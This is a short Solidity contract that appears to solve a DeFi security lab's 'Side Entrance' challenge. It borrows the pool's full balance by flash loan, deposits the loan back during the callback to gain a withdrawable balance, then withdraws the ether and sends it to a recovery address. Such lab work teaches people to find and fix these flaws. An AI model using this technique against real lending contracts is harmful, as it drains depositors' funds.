// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";
import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

contract AttackSideEntrance {
    SideEntranceLenderPool lenderPool;

    constructor(address _lenderPool) {
        lenderPool = SideEntranceLenderPool(_lenderPool);
    }

    function attack(address _recovery) external {
        lenderPool.flashLoan(address(lenderPool).balance);
        lenderPool.withdraw();
        SafeTransferLib.safeTransferETH(_recovery, address(this).balance);
    }

    function execute() external payable {
        lenderPool.deposit{value: address(this).balance}();
    }

    receive() external payable {}
}
